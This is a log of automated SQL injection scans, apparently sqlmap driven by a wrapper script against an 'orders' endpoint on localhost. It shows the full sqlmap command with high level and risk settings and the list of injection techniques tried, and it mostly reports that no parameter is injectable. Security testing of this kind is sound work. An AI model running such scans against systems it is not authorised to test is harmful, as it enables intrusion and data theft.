[19:01:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:01:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:01:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:01:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:01:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:01:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:01:46] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:01:46] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[19:01:46] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[19:01:46] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[19:01:46] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[19:01:46] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[19:01:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:01:47] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:01:48] [WARNING] parameter 'User-Agent' does not seem to be injectable
[19:01:48] [INFO] testing if parameter 'Referer' is dynamic
[19:01:48] [WARNING] parameter 'Referer' does not appear to be dynamic
[19:01:48] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
[19:01:48] [INFO] testing for SQL injection on parameter 'Referer'
[19:01:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:01:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:01:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:01:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:01:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:01:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:01:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:01:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:01:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:01:51] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[19:01:51] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[19:01:51] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[19:01:51] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[19:01:51] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[19:01:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:01:52] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:01:52] [WARNING] parameter 'Referer' does not seem to be injectable
[19:01:52] [INFO] testing if parameter 'Host' is dynamic
[19:01:52] [WARNING] parameter 'Host' does not appear to be dynamic
[19:01:52] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
[19:01:52] [INFO] testing for SQL injection on parameter 'Host'
[19:01:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:01:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:01:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:01:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:01:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:01:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:01:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:01:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:01:55] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:01:55] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[19:01:55] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[19:01:55] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[19:01:55] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[19:01:55] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[19:01:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:01:56] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:01:56] [WARNING] parameter 'Host' does not seem to be injectable
[19:01:56] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[19:01:56] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 3453 times, 404 (Not Found) - 4 times

[*] ending @ 19:01:56 /2025-09-26/

2025-09-26 19:01:57,185 - WARNING - Potential injection detected. Output saved to attack-logs-dynamic\Get_orders_for_a_user_discovery.log
2025-09-26 19:01:57,185 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/orders/test --output-dir 'attack-logs-dynamic\Get_orders_for_a_user_sqlmap' --batch --level=5 --risk=3 --threads 5 --dbs
2025-09-26 19:02:00,559 - INFO -         ___
2025-09-26 19:02:00,560 - INFO -        __H__
2025-09-26 19:02:00,561 - INFO -  ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 19:02:00,561 - INFO - |_ -| . [']     | .'| . |
2025-09-26 19:02:00,561 - INFO - |___|_  [(]_|_|_|__,|  _|
2025-09-26 19:02:00,561 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 19:02:00,561 - INFO - 
2025-09-26 19:02:00,584 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 19:02:00,584 - INFO - 
2025-09-26 19:02:00,584 - INFO - [*] starting @ 19:02:00 /2025-09-26/
2025-09-26 19:02:00,584 - INFO - 
2025-09-26 19:02:02,380 - INFO - [19:02:02] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_orders_for_a_user_sqlmap' as the output directory
2025-09-26 19:02:02,898 - INFO - [19:02:02] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 19:02:02,898 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 19:02:02,927 - INFO - [19:02:02] [INFO] testing connection to the target URL
2025-09-26 19:02:02,994 - INFO - [19:02:02] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
2025-09-26 19:02:02,994 - INFO - [19:02:02] [INFO] testing if the target URL content is stable
2025-09-26 19:02:03,449 - INFO - [19:02:03] [INFO] target URL content is stable
2025-09-26 19:02:03,449 - INFO - [19:02:03] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 19:02:03,486 - INFO - [19:02:03] [INFO] URI parameter '#1*' appears to be dynamic
2025-09-26 19:02:03,521 - INFO - [19:02:03] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 19:02:03,554 - INFO - [19:02:03] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 19:02:03,620 - INFO - [19:02:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:02:03,660 - INFO - [19:02:03] [WARNING] reflective value(s) found and filtering out
2025-09-26 19:02:04,741 - INFO - [19:02:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:02:05,823 - INFO - [19:02:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:02:06,885 - INFO - [19:02:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:02:07,717 - INFO - [19:02:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:02:08,325 - INFO - [19:02:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:02:08,542 - INFO - [19:02:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:02:08,749 - INFO - [19:02:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:02:08,953 - INFO - [19:02:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 19:02:09,421 - INFO - [19:02:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 19:02:09,866 - INFO - [19:02:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 19:02:10,322 - INFO - [19:02:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 19:02:10,855 - INFO - [19:02:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 19:02:11,261 - INFO - [19:02:11] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 19:02:12,033 - INFO - [19:02:12] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 19:02:12,944 - INFO - [19:02:12] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 19:02:13,851 - INFO - [19:02:13] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 19:02:14,740 - INFO - [19:02:14] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 19:02:15,800 - INFO - [19:02:15] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:02:16,638 - INFO - [19:02:16] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:02:17,511 - INFO - [19:02:17] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 19:02:18,381 - INFO - [19:02:18] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 19:02:19,496 - INFO - [19:02:19] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 19:02:20,296 - INFO - [19:02:20] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 19:02:21,232 - INFO - [19:02:21] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 19:02:22,008 - INFO - [19:02:22] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 19:02:22,941 - INFO - [19:02:22] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:02:22,963 - INFO - [19:02:22] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 19:02:22,986 - INFO - [19:02:22] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 19:02:23,000 - INFO - [19:02:23] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 19:02:23,023 - INFO - [19:02:23] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 19:02:23,044 - INFO - [19:02:23] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 19:02:23,058 - INFO - [19:02:23] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 19:02:23,083 - INFO - [19:02:23] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 19:02:23,118 - INFO - [19:02:23] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 19:02:23,135 - INFO - [19:02:23] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 19:02:23,172 - INFO - [19:02:23] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 19:02:23,196 - INFO - [19:02:23] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 19:02:23,211 - INFO - [19:02:23] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 19:02:23,244 - INFO - [19:02:23] [INFO] URI parameter '#1*' appears to be 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' injectable
2025-09-26 19:02:23,244 - INFO - it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
2025-09-26 19:02:23,244 - INFO - [19:02:23] [INFO] testing 'Generic inline queries'
2025-09-26 19:02:23,272 - INFO - [19:02:23] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
2025-09-26 19:02:23,272 - INFO - [19:02:23] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
2025-09-26 19:02:23,484 - INFO - [19:02:23] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
2025-09-26 19:02:23,743 - INFO - [19:02:23] [INFO] target URL appears to be UNION injectable with 6 columns
2025-09-26 19:02:24,093 - INFO - [19:02:24] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql')
2025-09-26 19:02:24,097 - INFO - [19:02:24] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
2025-09-26 19:02:24,275 - INFO - [19:02:24] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
2025-09-26 19:02:24,489 - INFO - [19:02:24] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
2025-09-26 19:02:24,672 - INFO - [19:02:24] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
2025-09-26 19:02:24,850 - INFO - [19:02:24] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
2025-09-26 19:02:25,014 - INFO - [19:02:25] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
2025-09-26 19:02:25,187 - INFO - [19:02:25] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
2025-09-26 19:02:25,363 - INFO - [19:02:25] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
2025-09-26 19:02:25,592 - INFO - [19:02:25] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
2025-09-26 19:02:25,607 - INFO - [19:02:25] [WARNING] false positive or unexploitable injection point detected
2025-09-26 19:02:25,607 - INFO - [19:02:25] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 19:02:25,607 - INFO - other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
2025-09-26 19:02:25,607 - INFO - [19:02:25] [INFO] testing if parameter 'User-Agent' is dynamic
2025-09-26 19:02:25,628 - INFO - [19:02:25] [WARNING] parameter 'User-Agent' does not appear to be dynamic
2025-09-26 19:02:25,645 - INFO - [19:02:25] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
2025-09-26 19:02:25,651 - INFO - [19:02:25] [INFO] testing for SQL injection on parameter 'User-Agent'
2025-09-26 19:02:25,712 - INFO - [19:02:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:02:26,156 - INFO - [19:02:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:02:26,811 - INFO - [19:02:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:02:27,201 - INFO - [19:02:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:02:27,513 - INFO - [19:02:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:02:27,889 - INFO - [19:02:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:02:27,956 - INFO - [19:02:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:02:28,094 - INFO - [19:02:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:02:28,168 - INFO - [19:02:28] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:02:28,189 - INFO - [19:02:28] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 19:02:28,196 - INFO - [19:02:28] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 19:02:28,202 - INFO - [19:02:28] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 19:02:28,221 - INFO - [19:02:28] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 19:02:28,229 - INFO - [19:02:28] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 19:02:28,497 - INFO - [19:02:28] [INFO] testing 'Generic inline queries'
2025-09-26 19:02:28,509 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 19:02:28,509 - INFO - [19:02:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:02:29,110 - INFO - [19:02:29] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 19:02:29,676 - INFO - [19:02:29] [WARNING] parameter 'User-Agent' does not seem to be injectable
2025-09-26 19:02:29,676 - INFO - [19:02:29] [INFO] testing if parameter 'Referer' is dynamic
2025-09-26 19:02:29,691 - INFO - [19:02:29] [WARNING] parameter 'Referer' does not appear to be dynamic
2025-09-26 19:02:29,702 - INFO - [19:02:29] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
2025-09-26 19:02:29,733 - INFO - [19:02:29] [INFO] testing for SQL injection on parameter 'Referer'
2025-09-26 19:02:29,828 - INFO - [19:02:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:02:30,340 - INFO - [19:02:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:02:31,166 - INFO - [19:02:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:02:31,644 - INFO - [19:02:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:02:31,988 - INFO - [19:02:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:02:32,401 - INFO - [19:02:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:02:32,493 - INFO - [19:02:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:02:32,639 - INFO - [19:02:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:02:32,731 - INFO - [19:02:32] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:02:32,756 - INFO - [19:02:32] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 19:02:32,766 - INFO - [19:02:32] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 19:02:32,786 - INFO - [19:02:32] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 19:02:32,798 - INFO - [19:02:32] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 19:02:32,812 - INFO - [19:02:32] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 19:02:33,176 - INFO - [19:02:33] [INFO] testing 'Generic inline queries'
2025-09-26 19:02:33,196 - INFO - [19:02:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:02:33,897 - INFO - [19:02:33] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 19:02:34,598 - INFO - [19:02:34] [WARNING] parameter 'Referer' does not seem to be injectable
2025-09-26 19:02:34,599 - INFO - [19:02:34] [INFO] testing if parameter 'Host' is dynamic
2025-09-26 19:02:34,609 - INFO - [19:02:34] [WARNING] parameter 'Host' does not appear to be dynamic
2025-09-26 19:02:34,612 - INFO - [19:02:34] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
2025-09-26 19:02:34,626 - INFO - [19:02:34] [INFO] testing for SQL injection on parameter 'Host'
2025-09-26 19:02:34,719 - INFO - [19:02:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:02:35,166 - INFO - [19:02:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:02:35,912 - INFO - [19:02:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:02:36,381 - INFO - [19:02:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:02:36,689 - INFO - [19:02:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:02:37,161 - INFO - [19:02:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:02:37,278 - INFO - [19:02:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:02:37,424 - INFO - [19:02:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:02:37,515 - INFO - [19:02:37] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:02:37,537 - INFO - [19:02:37] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 19:02:37,545 - INFO - [19:02:37] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 19:02:37,555 - INFO - [19:02:37] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 19:02:37,573 - INFO - [19:02:37] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 19:02:37,580 - INFO - [19:02:37] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 19:02:37,921 - INFO - [19:02:37] [INFO] testing 'Generic inline queries'
2025-09-26 19:02:37,946 - INFO - [19:02:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:02:38,568 - INFO - [19:02:38] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 19:02:39,085 - INFO - [19:02:39] [WARNING] parameter 'Host' does not seem to be injectable
2025-09-26 19:02:39,085 - INFO - [19:02:39] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 19:02:39,095 - INFO - [19:02:39] [WARNING] HTTP error codes detected during run:
2025-09-26 19:02:39,095 - INFO - 500 (Internal Server Error) - 3455 times, 404 (Not Found) - 4 times
2025-09-26 19:02:39,095 - INFO - 
2025-09-26 19:02:39,095 - INFO - [*] ending @ 19:02:39 /2025-09-26/
2025-09-26 19:02:39,095 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/orders/test --output-dir 'attack-logs-dynamic\Get_orders_for_a_user_sqlmap' --batch --level=5 --risk=3 --threads 5 --dbs
--------------------------------------------------
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:02:00 /2025-09-26/

[19:02:02] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_orders_for_a_user_sqlmap' as the output directory
[19:02:02] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[19:02:02] [INFO] testing connection to the target URL
[19:02:02] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[19:02:02] [INFO] testing if the target URL content is stable
[19:02:03] [INFO] target URL content is stable
[19:02:03] [INFO] testing if URI parameter '#1*' is dynamic
[19:02:03] [INFO] URI parameter '#1*' appears to be dynamic
[19:02:03] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[19:02:03] [INFO] testing for SQL injection on URI parameter '#1*'
[19:02:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:02:03] [WARNING] reflective value(s) found and filtering out
[19:02:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:02:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:02:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:02:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:02:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:02:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:02:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:02:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:02:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:02:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[19:02:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[19:02:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[19:02:11] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[19:02:12] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:02:12] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:02:13] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:02:14] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:02:15] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:02:16] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:02:17] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[19:02:18] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[19:02:19] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[19:02:20] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[19:02:21] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[19:02:22] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[19:02:22] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:02:22] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[19:02:22] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[19:02:23] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[19:02:23] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[19:02:23] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[19:02:23] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[19:02:23] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[19:02:23] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[19:02:23] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[19:02:23] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[19:02:23] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
